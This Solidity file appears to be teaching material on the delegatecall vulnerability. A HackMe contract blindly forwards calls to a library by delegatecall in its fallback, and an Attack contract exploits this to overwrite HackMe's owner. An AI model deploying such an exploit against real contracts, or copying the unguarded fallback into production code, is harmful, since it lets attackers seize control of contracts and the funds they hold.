// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/*
Delegate call
A -> B
1. The memory layout of A and B should be same
2. Delegatecall preservs context hence the B will update the state variables of A
with the memory layout pointers declated in B

In this example the memory layout is identical.
*/

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        // delegatecall with msg.data "pwm()" will call Lib's pwn()
        // which will update HackMe's owner address
        // since the state variables of Lib are of same order as this contract
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        // this call will execute the fallback function 
        // since there is no pwn() in HackMe
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
